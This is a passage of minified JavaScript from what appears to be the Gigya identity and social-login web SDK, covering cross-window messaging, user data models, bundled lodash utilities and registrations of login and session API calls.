          var i = this.getTabIndex(t) - this.getTabIndex(n);
          return 0 !== i ? i : Number(t.getAttribute(e.naturalTabOrder)) - Number(n.getAttribute(e.naturalTabOrder));
        }, e.prototype.getTabIndex = function (e) {
          return 0 === e.tabIndex ? 99999999 : e.tabIndex;
        }, e.prototype.getListenerByContainer = function (e) {
          for (var t = 0, n = this.bindings; t < n.length; t++) {
            var i = n[t];
            if (i.container === e) return i.listener;
          }
        }, e.naturalTabOrder = "data-natural-tab-order", e.selector = ["a:not([disabled])", "button:not([disabled])", "input:not([disabled])", "[tabindex]:not([disabled])"].join(","), e;
      }();
    t.Tabbable = o, t.tabbable = o.getInstance();
  }, function (e, t, n) {
    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var i = n(16),
      o = n(4),
      r = n(13),
      a = n(27),
      s = {};
    t._flashListenerID = "flid" + new Date().getTime();
    var c = !1;
    function u(e) {
      delete s[e];
    }
    t.addMessageListener = function (e, t, n, l, d) {
      if (s[e] = {
        callback: l,
        context: t,
        t: new Date().getTime()
      }, d || (d = window.gigya.localInfo.messagingMethod, window.gigya.localInfo.isIE11 && n && window.indexedDB && (d = a.MessagingMethod.LocalStorageListener), window.gigya.localInfo.isAndroid && t && t.provider && "line" == t.provider.toLowerCase() && (d = a.MessagingMethod.LocalStorageListener)), (d == a.MessagingMethod.LocalStorageListener || d == a.MessagingMethod.PostMessage) && (d == a.MessagingMethod.LocalStorageListener && n && function (e) {
        var t = document.createElement("iframe");
        t.style.width = "30px", t.style.height = "10px", t.style.position = "absolute", t.style.top = "-1000px", t.style.left = "-1000px", t.id = e, t.src = "https://cdns.gigya.com/gs/LocalStorageListener.htm?mode=receive&id=" + encodeURIComponent(e), r.appendToBody(t);
      }(e), !c)) {
        var g = function (e) {
          if (e && e.data && "string" == typeof e.data) {
            var t = e.data.split("=")[0];
            s[t] && (n = e, r = function () {
              var e = n.data.split("="),
                t = s[e[0]];
              if (null != t) {
                if ("function" == typeof t.callback) {
                  var o = unescape(e[1]),
                    r = i.deserialize(o, null, null, !0),
                    a = t.context;
                  t.callback(r, a);
                }
                u(e[0]);
                var c = document.getElementById(e[0]);
                c && c.parentElement && c.parentElement.removeChild(c);
              }
            }, (n = o.clone(n)) && n.data && n.data.split && (window.gigya.localInfo.iosVersion >= 6 ? r() : window.setTimeout(r, 100)));
          }
          var n, r;
        };
        window.addEventListener ? window.addEventListener("message", g, !1) : window.attachEvent && window.attachEvent("onmessage", g), c = !0;
      }
    }, t.removeMessageListener = u;
  }, function (e, t, n) {
    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var i = n(5),
      o = n(4),
      r = {},
      a = {
        User: "personwithuid+isLoggedIn|false,isConnected|false,isSiteUser|false,identities|{},providers|[],timestamp,UIDSig,UIDSignature,signatureTimestamp,loginProvider,loginProviderUID,capabilities|{}",
        Friend: "personwithuid+timestamp,friendshipSig,friendshipSignature,signatureTimestamp,timestamp,isSiteUser|false,identities|{}",
        Identity: "person+isExpiredSession|false,allowsLogin|false,providerUID,provider,isLoginIdentity|false,missingPermissions",
        Contact: "provider,firstName,lastName,nickname,email,photoURL",
        person: "nickname,photoURL,thumbnailURL,birthDay|0,birthMonth|0,birthYear|0,gender,email,proxiedEmail,country,state,city,zip,firstName,lastName,profileURL,age|0",
        personwithuid: "person+UID,isSiteUID|false",
        UserAction: "actorUID,actorNickname,actionName,date|new Date(),targets|[],images|[],actionData1,actionData2,iconURL,title,linkBack,userMessage,description,actionLinks|[],mediaItems|[],subtitle"
      },
      s = function (e) {
        var t = {},
          n = a[e];
        -1 != n.indexOf("+") && (t = s(n.split("+")[0]), n = n.split("+")[1]);
        for (var o = n.split(","), r = 0; r < o.length; r++) {
          var c = "",
            u = o[r].split("|");
          if (u.length > 1) try {
            c = i.deserialize(u[1], "");
          } catch (e) {}
          t[u[0]] = c || "";
        }
        return t;
      },
      c = function (e) {
        return function (t) {
          var n = r[e];
          for (var i in n) this[i] = o.clone(n[i]);
          if ("object" == typeof t) for (var i in t) "function" != typeof t[i] && (this[i] = o.clone(t[i]));
        };
      };
    for (var u in a) r[u] = s(u), window.gigya.socialize[u] = c(u);
    window.gigya.socialize.Collection = function (e, t) {
      this.arr = e, this._key = t || "";
    }, window.gigya.socialize.Collection.prototype = {
      asArray: function () {
        return this.arr;
      },
      each: function (e) {
        for (var t = 0, n = this.arr[t]; n;) e(n, t), t++, n = this.arr[t];
      },
      getById: function (e) {
        return void 0 === this._hash && this._buildHash(), (this._hash ? this._hash : this.arr)[e];
      },
      getSize: function () {
        return this.arr.length;
      },
      _buildHash: function () {
        var e = this._hash = {},
          t = this._key;
        this.each(function (n, i) {
          e["function" == typeof n[t] ? n[t]() : n[t]] = n;
        });
      }
    }, window.gigya.socialize.UserAction.prototype = {
      clone: function () {
        return new window.gigya.socialize.UserAction(window.gigya.utils.object.clone(this, !0, !0));
      },
      getTemplate: function () {
        return this.titleTemplate;
      },
      setTemplate: function (e) {
        this.titleTemplate = e;
      },
      getActor: function (e) {
        return {
          UID: this.actorUID,
          nickname: this.actorNickname
        };
      },
      setActionName: function (e) {
        return this.actionName = e, this;
      },
      getActionName: function (e) {
        return this.actionName;
      },
      getTemplateFields: function () {
        var e = [];
        for (var t in this.templateFields) e.push(this.templateFields[t]);
        return new window.gigya.socialize.Collection(e, "fieldName");
      },
      setTemplateField: function (e, t, n) {
        return this.templateFields[e] = {
          fieldName: e,
          text: t,
          href: n
        }, this;
      },
      getTemplateField: function (e) {
        return this.templateFields[e] ? this.templateFields[e] : null;
      },
      addTarget: function (e) {
        return "object" == typeof e ? (this.targets.push({
          UID: e.UID,
          nickname: e.nickname ? e.nickname : ""
        }), this) : "string" == typeof e ? (this.targets.push({
          UID: e,
          nickname: ""
        }), this) : void 0;
      },
      addActionLink: function (e, t) {
        return this.actionLinks.push({
          text: e,
          href: t || ""
        }), this;
      },
      addMediaItem: function (e) {
        return this.mediaItems.push(e), this;
      },
      setTitle: function (e) {
        return e && (this.title = e), this;
      },
      setLinkBack: function (e) {
        return e && e.toString && (e = e.toString()), e && (this.linkBack = e), this;
      },
      setUserMessage: function (e) {
        return this.userMessage = e || "", this;
      },
      setDescription: function (e) {
        return this.description = e || "", this;
      },
      addImage: function (e, t) {
        this.addMediaItem({
          type: "image",
          src: e,
          href: t
        });
      },
      getImages: function () {
        return new window.gigya.socialize.Collection(this.images, "");
      },
      getTargets: function () {
        return new window.gigya.socialize.Collection(this.targets, "UID");
      },
      setIconURL: function (e) {
        return this.iconURL = e, this;
      },
      getIconURL: function () {
        return this.iconURL;
      },
      getDate: function () {
        return this.date;
      },
      setActionData1: function (e) {
        return this.actionData1 = e, this;
      },
      getActionData1: function (e) {
        return this.actionData1;
      },
      setActionData2: function (e) {
        return this.actionData2 = e, this;
      },
      getActionData2: function (e) {
        return this.actionData2;
      },
      setSubtitle: function (e) {
        return this.subtitle = e, this;
      },
      getSubtitle: function () {
        return this.subtitle;
      }
    };
  }, function (e, t, n) {
    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var i = n(158);
    t.REPORT_EVENT_CATEGORIES = {
      screenSets: "screenSets"
    }, t.ScreenSetEvents = ["afterScreenLoad", "submit"], t.defaultScreenSetReportID = "screen-set-report-events-map", t.defaultScreenSetReportConfig = {
      id: t.defaultScreenSetReportID,
      defaultMethod: function (e) {
        var n = e.abTesting,
          o = e.screenSetID,
          r = e.eventName;
        if (!n || !o || !r) return;
        var a = n.requestedScreenId,
          s = n.variantId,
          c = n.testId;
        if (!s || !c || !a) return;
        var u = o + "/" + a + "/" + c,
          l = {
            eventCategory: t.REPORT_EVENT_CATEGORIES.screenSets,
            eventTime: Date.now(),
            eventType: r,
            eventData: s,
            eventId: i.replaceNotAllowedReportChars(u, "-")
          };
        i.queue.push(l);
      },
      eventMap: [{
        events: t.ScreenSetEvents.join(","),
        args: [function (e) {
          return e;
        }]
      }]
    };
  }, function (e, t, n) {
    (function (e, n) {
      var i = "[object Arguments]",
        o = "[object Map]",
        r = "[object Object]",
        a = "[object Set]",
        s = /\.|\[(?:[^[\]]*|(["'])(?:(?!\1)[^\\]|\\.)*?\1)\]/,
        c = /^\w*$/,
        u = /^\./,
        l = /[^.[\]]+|\[(?:(-?\d+(?:\.\d+)?)|(["'])((?:(?!\2)[^\\]|\\.)*?)\2)\]|(?=(?:\.|\[\])(?:\.|\[\]|$))/g,
        d = /\\(\\)?/g,
        g = /^\[object .+?Constructor\]$/,
        f = /^(?:0|[1-9]\d*)$/,
        p = {};
      p["[object Float32Array]"] = p["[object Float64Array]"] = p["[object Int8Array]"] = p["[object Int16Array]"] = p["[object Int32Array]"] = p["[object Uint8Array]"] = p["[object Uint8ClampedArray]"] = p["[object Uint16Array]"] = p["[object Uint32Array]"] = !0, p[i] = p["[object Array]"] = p["[object ArrayBuffer]"] = p["[object Boolean]"] = p["[object DataView]"] = p["[object Date]"] = p["[object Error]"] = p["[object Function]"] = p[o] = p["[object Number]"] = p[r] = p["[object RegExp]"] = p[a] = p["[object String]"] = p["[object WeakMap]"] = !1;
      var h = "object" == typeof e && e && e.Object === Object && e,
        v = "object" == typeof self && self && self.Object === Object && self,
        y = h || v || Function("return this")(),
        w = t && !t.nodeType && t,
        m = w && "object" == typeof n && n && !n.nodeType && n,
        _ = m && m.exports === w && h.process,
        b = function () {
          try {
            return _ && _.binding("util");
          } catch (e) {}
        }(),
        S = b && b.isTypedArray;
      function P(e, t) {
        for (var n = -1, i = e ? e.length : 0; ++n < i;) if (t(e[n], n, e)) return !0;
        return !1;
      }
      function A(e) {
        var t = !1;
        if (null != e && "function" != typeof e.toString) try {
          t = !!(e + "");
        } catch (e) {}
        return t;
      }
      function I(e) {
        var t = -1,
          n = Array(e.size);
        return e.forEach(function (e, i) {
          n[++t] = [i, e];
        }), n;
      }
      function k(e) {
        var t = -1,
          n = Array(e.size);
        return e.forEach(function (e) {
          n[++t] = e;
        }), n;
      }
      var C,
        x,
        O,
        E = Array.prototype,
        T = Function.prototype,
        L = Object.prototype,
        D = y["__core-js_shared__"],
        j = (C = /[^.]+$/.exec(D && D.keys && D.keys.IE_PROTO || "")) ? "Symbol(src)_1." + C : "",
        M = T.toString,
        R = L.hasOwnProperty,
        U = L.toString,
        N = RegExp("^" + M.call(R).replace(/[\\^$.*+?()[\]{}|]/g, "\\$&").replace(/hasOwnProperty|(function).*?(?=\\\()| for .+?(?=\\\])/g, "$1.*?") + "$"),
        z = y.Symbol,
        F = y.Uint8Array,
        K = L.propertyIsEnumerable,
        B = E.splice,
        G = (x = Object.keys, O = Object, function (e) {
          return x(O(e));
        }),
        q = _e(y, "DataView"),
        V = _e(y, "Map"),
        H = _e(y, "Promise"),
        W = _e(y, "Set"),
        J = _e(y, "WeakMap"),
        $ = _e(Object, "create"),
        Y = Oe(q),
        Q = Oe(V),
        X = Oe(H),
        Z = Oe(W),
        ee = Oe(J),
        te = z ? z.prototype : void 0,
        ne = te ? te.valueOf : void 0,
        ie = te ? te.toString : void 0;
      function oe(e) {
        var t = -1,
          n = e ? e.length : 0;
        for (this.clear(); ++t < n;) {
          var i = e[t];
          this.set(i[0], i[1]);
        }
      }
      function re(e) {
        var t = -1,
          n = e ? e.length : 0;
        for (this.clear(); ++t < n;) {
          var i = e[t];
          this.set(i[0], i[1]);
        }
      }
      function ae(e) {
        var t = -1,
          n = e ? e.length : 0;
        for (this.clear(); ++t < n;) {
          var i = e[t];
          this.set(i[0], i[1]);
        }
      }
      function se(e) {
        var t = -1,
          n = e ? e.length : 0;
        for (this.__data__ = new ae(); ++t < n;) this.add(e[t]);
      }
      function ce(e) {
        this.__data__ = new re(e);
      }
      function ue(e, t) {
        var n = je(e) || De(e) ? function (e, t) {
            for (var n = -1, i = Array(e); ++n < e;) i[n] = t(n);
            return i;
          }(e.length, String) : [],
          i = n.length,
          o = !!i;
        for (var r in e) !t && !R.call(e, r) || o && ("length" == r || Se(r, i)) || n.push(r);
        return n;
      }
      function le(e, t) {
        for (var n = e.length; n--;) if (Le(e[n][0], t)) return n;
        return -1;
      }
      function de(e, t) {
        for (var n = 0, i = (t = Pe(t, e) ? [t] : ye(t)).length; null != e && n < i;) e = e[xe(t[n++])];
        return n && n == i ? e : void 0;
      }
      function ge(e, t) {
        return null != e && t in Object(e);
      }
      function fe(e, t, n, s, c) {
        return e === t || (null == e || null == t || !Ne(e) && !ze(t) ? e != e && t != t : function (e, t, n, s, c, u) {
          var l = je(e),
            d = je(t),
            g = "[object Array]",
            f = "[object Array]";
          l || (g = (g = be(e)) == i ? r : g);
          d || (f = (f = be(t)) == i ? r : f);
          var p = g == r && !A(e),
            h = f == r && !A(t),
            v = g == f;
          if (v && !p) return u || (u = new ce()), l || Ke(e) ? we(e, t, n, s, c, u) : function (e, t, n, i, r, s, c) {
            switch (n) {
              case "[object DataView]":
                if (e.byteLength != t.byteLength || e.byteOffset != t.byteOffset) return !1;
                e = e.buffer, t = t.buffer;
              case "[object ArrayBuffer]":
                return !(e.byteLength != t.byteLength || !i(new F(e), new F(t)));
              case "[object Boolean]":
              case "[object Date]":
              case "[object Number]":
                return Le(+e, +t);
              case "[object Error]":
                return e.name == t.name && e.message == t.message;
              case "[object RegExp]":
              case "[object String]":
                return e == t + "";
              case o:
                var u = I;
              case a:
                var l = 2 & s;
                if (u || (u = k), e.size != t.size && !l) return !1;
                var d = c.get(e);
                if (d) return d == t;
                s |= 1, c.set(e, t);
                var g = we(u(e), u(t), i, r, s, c);
                return c.delete(e), g;
              case "[object Symbol]":
                if (ne) return ne.call(e) == ne.call(t);
            }
            return !1;
          }(e, t, g, n, s, c, u);
          if (!(2 & c)) {
            var y = p && R.call(e, "__wrapped__"),
              w = h && R.call(t, "__wrapped__");
            if (y || w) {
              var m = y ? e.value() : e,
                _ = w ? t.value() : t;
              return u || (u = new ce()), n(m, _, s, c, u);
            }
          }
          if (!v) return !1;
          return u || (u = new ce()), function (e, t, n, i, o, r) {
            var a = 2 & o,
              s = Be(e),
              c = s.length,
              u = Be(t).length;
            if (c != u && !a) return !1;
            var l = c;
            for (; l--;) {
              var d = s[l];
              if (!(a ? d in t : R.call(t, d))) return !1;
            }
            var g = r.get(e);
            if (g && r.get(t)) return g == t;
            var f = !0;
            r.set(e, t), r.set(t, e);
            var p = a;
            for (; ++l < c;) {
              d = s[l];
              var h = e[d],
                v = t[d];
              if (i) var y = a ? i(v, h, d, t, e, r) : i(h, v, d, e, t, r);
              if (!(void 0 === y ? h === v || n(h, v, i, o, r) : y)) {
                f = !1;
                break;
              }
              p || (p = "constructor" == d);
            }
            if (f && !p) {
              var w = e.constructor,
                m = t.constructor;
              w == m || !("constructor" in e) || !("constructor" in t) || "function" == typeof w && w instanceof w && "function" == typeof m && m instanceof m || (f = !1);
            }
            return r.delete(e), r.delete(t), f;
          }(e, t, n, s, c, u);
        }(e, t, fe, n, s, c));
      }
      function pe(e) {
        return !(!Ne(e) || function (e) {
          return !!j && j in e;
        }(e)) && (Re(e) || A(e) ? N : g).test(Oe(e));
      }
      function he(e) {
        return "function" == typeof e ? e : null == e ? Ge : "object" == typeof e ? je(e) ? function (e, t) {
          if (Pe(e) && Ae(t)) return Ie(xe(e), t);
          return function (n) {
            var i = function (e, t, n) {
              var i = null == e ? void 0 : de(e, t);
              return void 0 === i ? n : i;
            }(n, e);
            return void 0 === i && i === t ? function (e, t) {
              return null != e && function (e, t, n) {
                t = Pe(t, e) ? [t] : ye(t);
                var i,
                  o = -1,
                  r = t.length;
                for (; ++o < r;) {
                  var a = xe(t[o]);
                  if (!(i = null != e && n(e, a))) break;
                  e = e[a];
                }
                if (i) return i;
                return !!(r = e ? e.length : 0) && Ue(r) && Se(a, r) && (je(e) || De(e));
              }(e, t, ge);
            }(n, e) : fe(t, i, void 0, 3);
          };
        }(e[0], e[1]) : function (e) {
          var t = function (e) {
            var t = Be(e),
              n = t.length;
            for (; n--;) {
              var i = t[n],
                o = e[i];
              t[n] = [i, o, Ae(o)];
            }
            return t;
          }(e);
          if (1 == t.length && t[0][2]) return Ie(t[0][0], t[0][1]);
          return function (n) {
            return n === e || function (e, t, n, i) {
              var o = n.length,
                r = o,
                a = !i;
              if (null == e) return !r;
              for (e = Object(e); o--;) {
                var s = n[o];
                if (a && s[2] ? s[1] !== e[s[0]] : !(s[0] in e)) return !1;
              }
              for (; ++o < r;) {
                var c = (s = n[o])[0],
                  u = e[c],
                  l = s[1];
                if (a && s[2]) {
                  if (void 0 === u && !(c in e)) return !1;
                } else {
                  var d = new ce();
                  if (i) var g = i(u, l, c, e, t, d);
                  if (!(void 0 === g ? fe(l, u, i, 3, d) : g)) return !1;
                }
              }
              return !0;
            }(n, e, t);
          };
        }(e) : Pe(t = e) ? (n = xe(t), function (e) {
          return null == e ? void 0 : e[n];
        }) : function (e) {
          return function (t) {
            return de(t, e);
          };
        }(t);
        var t, n;
      }
      function ve(e) {
        if (n = (t = e) && t.constructor, i = "function" == typeof n && n.prototype || L, t !== i) return G(e);
        var t,
          n,
          i,
          o = [];
        for (var r in Object(e)) R.call(e, r) && "constructor" != r && o.push(r);
        return o;
      }
      function ye(e) {
        return je(e) ? e : Ce(e);
      }
      function we(e, t, n, i, o, r) {
        var a = 2 & o,
          s = e.length,
          c = t.length;
        if (s != c && !(a && c > s)) return !1;
        var u = r.get(e);
        if (u && r.get(t)) return u == t;
        var l = -1,
          d = !0,
          g = 1 & o ? new se() : void 0;
        for (r.set(e, t), r.set(t, e); ++l < s;) {
          var f = e[l],
            p = t[l];
          if (i) var h = a ? i(p, f, l, t, e, r) : i(f, p, l, e, t, r);
          if (void 0 !== h) {
            if (h) continue;
            d = !1;
            break;
          }
          if (g) {
            if (!P(t, function (e, t) {
              if (!g.has(t) && (f === e || n(f, e, i, o, r))) return g.add(t);
            })) {
              d = !1;
              break;
            }
          } else if (f !== p && !n(f, p, i, o, r)) {
            d = !1;
            break;
          }
        }
        return r.delete(e), r.delete(t), d;
      }
      function me(e, t) {
        var n,
          i,
          o = e.__data__;
        return ("string" == (i = typeof (n = t)) || "number" == i || "symbol" == i || "boolean" == i ? "__proto__" !== n : null === n) ? o["string" == typeof t ? "string" : "hash"] : o.map;
      }
      function _e(e, t) {
        var n = function (e, t) {
          return null == e ? void 0 : e[t];
        }(e, t);
        return pe(n) ? n : void 0;
      }
      oe.prototype.clear = function () {
        this.__data__ = $ ? $(null) : {};
      }, oe.prototype.delete = function (e) {
        return this.has(e) && delete this.__data__[e];
      }, oe.prototype.get = function (e) {
        var t = this.__data__;
        if ($) {
          var n = t[e];
          return "__lodash_hash_undefined__" === n ? void 0 : n;
        }
        return R.call(t, e) ? t[e] : void 0;
      }, oe.prototype.has = function (e) {
        var t = this.__data__;
        return $ ? void 0 !== t[e] : R.call(t, e);
      }, oe.prototype.set = function (e, t) {
        return this.__data__[e] = $ && void 0 === t ? "__lodash_hash_undefined__" : t, this;
      }, re.prototype.clear = function () {
        this.__data__ = [];
      }, re.prototype.delete = function (e) {
        var t = this.__data__,
          n = le(t, e);
        return !(n < 0) && (n == t.length - 1 ? t.pop() : B.call(t, n, 1), !0);
      }, re.prototype.get = function (e) {
        var t = this.__data__,
          n = le(t, e);
        return n < 0 ? void 0 : t[n][1];
      }, re.prototype.has = function (e) {
        return le(this.__data__, e) > -1;
      }, re.prototype.set = function (e, t) {
        var n = this.__data__,
          i = le(n, e);
        return i < 0 ? n.push([e, t]) : n[i][1] = t, this;
      }, ae.prototype.clear = function () {
        this.__data__ = {
          hash: new oe(),
          map: new (V || re)(),
          string: new oe()
        };
      }, ae.prototype.delete = function (e) {
        return me(this, e).delete(e);
      }, ae.prototype.get = function (e) {
        return me(this, e).get(e);
      }, ae.prototype.has = function (e) {
        return me(this, e).has(e);
      }, ae.prototype.set = function (e, t) {
        return me(this, e).set(e, t), this;
      }, se.prototype.add = se.prototype.push = function (e) {
        return this.__data__.set(e, "__lodash_hash_undefined__"), this;
      }, se.prototype.has = function (e) {
        return this.__data__.has(e);
      }, ce.prototype.clear = function () {
        this.__data__ = new re();
      }, ce.prototype.delete = function (e) {
        return this.__data__.delete(e);
      }, ce.prototype.get = function (e) {
        return this.__data__.get(e);
      }, ce.prototype.has = function (e) {
        return this.__data__.has(e);
      }, ce.prototype.set = function (e, t) {
        var n = this.__data__;
        if (n instanceof re) {
          var i = n.__data__;
          if (!V || i.length < 199) return i.push([e, t]), this;
          n = this.__data__ = new ae(i);
        }
        return n.set(e, t), this;
      };
      var be = function (e) {
        return U.call(e);
      };
      function Se(e, t) {
        return !!(t = null == t ? 9007199254740991 : t) && ("number" == typeof e || f.test(e)) && e > -1 && e % 1 == 0 && e < t;
      }
      function Pe(e, t) {
        if (je(e)) return !1;
        var n = typeof e;
        return !("number" != n && "symbol" != n && "boolean" != n && null != e && !Fe(e)) || c.test(e) || !s.test(e) || null != t && e in Object(t);
      }
      function Ae(e) {
        return e == e && !Ne(e);
      }
      function Ie(e, t) {
        return function (n) {
          return null != n && n[e] === t && (void 0 !== t || e in Object(n));
        };
      }
      function ke(e, t) {
        return 1 == t.length ? e : de(e, function (e, t, n) {
          var i = -1,
            o = e.length;
          t < 0 && (t = -t > o ? 0 : o + t), (n = n > o ? o : n) < 0 && (n += o), o = t > n ? 0 : n - t >>> 0, t >>>= 0;
          for (var r = Array(o); ++i < o;) r[i] = e[i + t];
          return r;
        }(t, 0, -1));
      }
      (q && "[object DataView]" != be(new q(new ArrayBuffer(1))) || V && be(new V()) != o || H && "[object Promise]" != be(H.resolve()) || W && be(new W()) != a || J && "[object WeakMap]" != be(new J())) && (be = function (e) {
        var t = U.call(e),
          n = t == r ? e.constructor : void 0,
          i = n ? Oe(n) : void 0;
        if (i) switch (i) {
          case Y:
            return "[object DataView]";
          case Q:
            return o;
          case X:
            return "[object Promise]";
          case Z:
            return a;
          case ee:
            return "[object WeakMap]";
        }
        return t;
      });
      var Ce = Te(function (e) {
        var t;
        e = null == (t = e) ? "" : function (e) {
          if ("string" == typeof e) return e;
          if (Fe(e)) return ie ? ie.call(e) : "";
          var t = e + "";
          return "0" == t && 1 / e == -1 / 0 ? "-0" : t;
        }(t);
        var n = [];
        return u.test(e) && n.push(""), e.replace(l, function (e, t, i, o) {
          n.push(i ? o.replace(d, "$1") : t || e);
        }), n;
      });
      function xe(e) {
        if ("string" == typeof e || Fe(e)) return e;
        var t = e + "";
        return "0" == t && 1 / e == -1 / 0 ? "-0" : t;
      }
      function Oe(e) {
        if (null != e) {
          try {
            return M.call(e);
          } catch (e) {}
          try {
            return e + "";
          } catch (e) {}
        }
        return "";
      }
      function Ee(e) {
        var t = e ? e.length : 0;
        return t ? e[t - 1] : void 0;
      }
      function Te(e, t) {
        if ("function" != typeof e || t && "function" != typeof t) throw new TypeError("Expected a function");
        var n = function () {
          var i = arguments,
            o = t ? t.apply(this, i) : i[0],
            r = n.cache;
          if (r.has(o)) return r.get(o);
          var a = e.apply(this, i);
          return n.cache = r.set(o, a), a;
        };
        return n.cache = new (Te.Cache || ae)(), n;
      }
      function Le(e, t) {
        return e === t || e != e && t != t;
      }
      function De(e) {
        return function (e) {
          return ze(e) && Me(e);
        }(e) && R.call(e, "callee") && (!K.call(e, "callee") || U.call(e) == i);
      }
      Te.Cache = ae;
      var je = Array.isArray;
      function Me(e) {
        return null != e && Ue(e.length) && !Re(e);
      }
      function Re(e) {
        var t = Ne(e) ? U.call(e) : "";
        return "[object Function]" == t || "[object GeneratorFunction]" == t;
      }
      function Ue(e) {
        return "number" == typeof e && e > -1 && e % 1 == 0 && e <= 9007199254740991;
      }
      function Ne(e) {
        var t = typeof e;
        return !!e && ("object" == t || "function" == t);
      }
      function ze(e) {
        return !!e && "object" == typeof e;
      }
      function Fe(e) {
        return "symbol" == typeof e || ze(e) && "[object Symbol]" == U.call(e);
      }
      var Ke = S ? function (e) {
        return function (t) {
          return e(t);
        };
      }(S) : function (e) {
        return ze(e) && Ue(e.length) && !!p[U.call(e)];
      };
      function Be(e) {
        return Me(e) ? ue(e) : ve(e);
      }
      function Ge(e) {
        return e;
      }
      n.exports = function (e, t) {
        var n = [];
        if (!e || !e.length) return n;
        var i = -1,
          o = [],
          r = e.length;
        for (t = he(t); ++i < r;) {
          var a = e[i];
          t(a, i, e) && (n.push(a), o.push(i));
        }
        return function (e, t) {
          for (var n = e ? t.length : 0, i = n - 1; n--;) {
            var o = t[n];
            if (n == i || o !== r) {
              var r = o;
              if (Se(o)) B.call(e, o, 1);else if (Pe(o, e)) delete e[xe(o)];else {
                var a = ye(o),
                  s = ke(e, a);
                null != s && delete s[xe(Ee(a))];
              }
            }
          }
        }(e, o), n;
      };
    }).call(this, n(23), n(51)(e));
  }, function (e, t, n) {
    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var i = n(123),
      o = n(147),
      r = n(9),
      a = n(94),
      s = n(270),
      c = n(97),
      u = function (e) {
        return "link" !== e.loginMode && "reAuth" !== e.loginMode;
      },
      l = function (e, t) {
        e.noAuth = !0, t();
      },
      d = function (e, t) {
        window.gigya.globalAccount.dataCenter && (e.dataCenter = window.gigya.globalAccount.dataCenter), t();
      },
      g = function (e, t) {
        window.gigya._.apiAdapter.isSessionValid({}, function (t) {
          t && (null == e || delete e.regToken);
        }), t();
      };
    t.logoutBehaviour = {
      logoutBeforeServerResponse: !0,
      alwaysSendLogoutToServer: !1
    };
    var f = function (e, t) {
        window.gigya.partnerSettings.ssoKey && (e.signIDs = !0), t();
      },
      p = function () {
        return !t.logoutBehaviour.alwaysSendLogoutToServer;
      };
    t.arApiList = [new i.ServerApi("socialize.login", c.defaultOauthSchema, !1, {
      oauth: !0,
      preprocessor: d
    }, {
      clearSessionCondition: u
    }), new i.ServerApi("socialize.addConnection", c.defaultOauthSchema, !1, {
      oauth: !0
    }, {}), new i.ServerApi("socialize.requestPermissions", c.defaultOauthSchema, !0, {
      oauth: !0,
      defaultParams: {
        forcePermissions: !0
      }
    }, {}), new i.ServerApi("accounts.socialLogin", c.defaultOauthSchema, !1, {
      oauth: !0,
      preprocessor: d
    }, {
      clearSessionCondition: u
    }), new o.UiApi("showDebugUI", "socialize.plugins.debug", {}, {}, "", {
      allowPopup: !0
    }), o.UiApi.createApi("showMyPhotoUI", "accounts", "profilePhoto.MyPhotoPlugin", "accounts.plugins.profilePhoto"), o.UiApi.createApi("runJsUnitTests", "_", "JsUtRunner.Jasmine.JasmineUtRunnerPlugin", "_.plugins.jsUtRunner"), o.UiApi.createApi("loadBasePlugin", "_", "Mock.MockPlugin", "_.plugins.mock"), new o.UiApi("showLoginUI_v1", "socialize.plugins.login", {
      width: 120,
      height: 110
    }, {
      width: 280,
      height: 220
    }, "", {
      allowPopup: !0
    }), o.UiApi.createApi("showLoginUI_v2", "socialize", "login_v2.LoginPlugin", "socialize.plugins.login_v2"), o.UiApi.versionSelector("showLoginUI", "socialize", "1", [{
      versionName: "1",
      method: window.gigya.socialize.showLoginUI_v1
    }, {
      versionName: "2",
      method: window.gigya.socialize.showLoginUI_v2
    }]), new o.UiApi("showAddConnectionsUI_v1", "socialize.plugins.login", {
      width: 110,
      height: 65
    }, {
      width: 250,
      height: 200
    }, "", {
      allowPopup: !0
    }), o.UiApi.createApi("showAddConnectionsUI_v2", "socialize", "login_v2.LoginPlugin", "socialize.plugins.login_v2"), o.UiApi.versionSelector("showAddConnectionsUI", "socialize", "1", [{
      versionName: "1",
      method: window.gigya.socialize.showAddConnectionsUI_v1
    }, {
      versionName: "2",
      method: window.gigya.socialize.showAddConnectionsUI_v2
    }]), o.UiApi.createApi("showEditConnectionsUI", "socialize", "editConnections.EditConnectionPlugin", "socialize.plugins.edit"), new o.UiApi("showSimpleShareUI", "socialize.plugins.simpleShare", {
      width: 280,
      height: 175
    }, {}, "userAction", {
      allowPopup: !0,
      dontLoadPluginsCore: !0,
      waitForAPIQueue: !0
    }), new o.UiApi("showShareMobileUI", "socialize.plugins.shareMobile", {}, {}, "userAction", {
      allowPopup: !0
    }), new o.UiApi("showTfaUI", "accounts.plugins.tfa", {
      width: 325
    }), o.UiApi.createApi("initHostedPage", "accounts", "Pages.PagesPlugin", "accounts.plugins.pages", void 0), o.UiApi.createApi("showScreenSet", "accounts", "ScreenSet.ScreenSetPlugin", "accounts.plugins.screenSet", void 0, ["hideScreenSet", "switchScreen"]), new i.ServerApi("socialize.getAvailableProviders", "enabledProviders|disabledProviders|requiredCapabilities", void 0, {}, {}), new i.ServerApi("socialize.notifyLogin", "siteUID|UIDTimestamp|UIDSig|UIDNonce|provider|authToken|tokenSecret|regSource|tokenExpiration|sessionHandle|sessionHandleExpiration|userInfo|providerSessions|sessionExpiration|authCode|includeAllIdentitiesincludeiRank|group|settings|extraFields|signIDs|newUser|actionAttributes|profileAttributes|bp_channel_url|lang|signKeys", !1, {}, {
      clearSession: !0
    }), new i.ServerApi("socialize.convertAction", "userAction|[providerCapability=actions]UserAction|provider", void 0, {}, {}), new i.ServerApi("socialize.deleteAccount", void 0, !0, {}, {}), new i.ServerApi("socialize.delUserSettings", "group|settings", !0, {}, {}), new i.ServerApi("socialize.getContacts", "enabledProviders|disabledProviders", !0, {}, {}), new i.ServerApi("socialize.getRawData", "provider|UID|fields|dataFormat|path", !0, {}, {}), new i.ServerApi("socialize.getSessionInfo", "provider|paddingMode|encrypt|signIDs|encryptAll", !0, {}, {}), new i.ServerApi("socialize.getUserInfo", "enabledProviders|disabledProviders|signIDs|includeiRank|includeAllIdentities|extraFields|group|settings|includeOpenidUID|include", !0, {}, {}), new i.ServerApi("socialize.checkin", "enabledProviders|disabledProviders|placeID|comment|latitude|longitude|actionAttributes|profileAttributes", !0, {}, {}), new i.ServerApi("socialize.logout", "signIDs|samlContext|sustainLogoutURLs", !0, {
      preprocessor: f,
      disableCache: !0
